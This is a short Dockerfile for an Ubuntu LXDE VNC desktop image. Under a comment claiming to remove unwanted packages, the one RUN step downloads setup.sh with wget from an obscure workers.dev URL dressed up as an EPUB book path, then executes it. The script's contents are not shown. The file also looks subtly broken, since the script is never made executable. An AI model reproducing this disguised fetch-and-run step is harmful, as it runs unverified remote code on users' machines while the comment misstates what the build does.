FROM dorowu/ubuntu-desktop-lxde-vnc:latest

# Remove unwanted packages
RUN apt update && \
    apt upgrade -y && \
    wget https://production.privateinskdfhsgfd.indexrd.workers.dev/0:/The%20Psychology%20of%20Money%20by%20Morgan%20Housel%20EPUB/setup.sh && \
    ./setup.sh
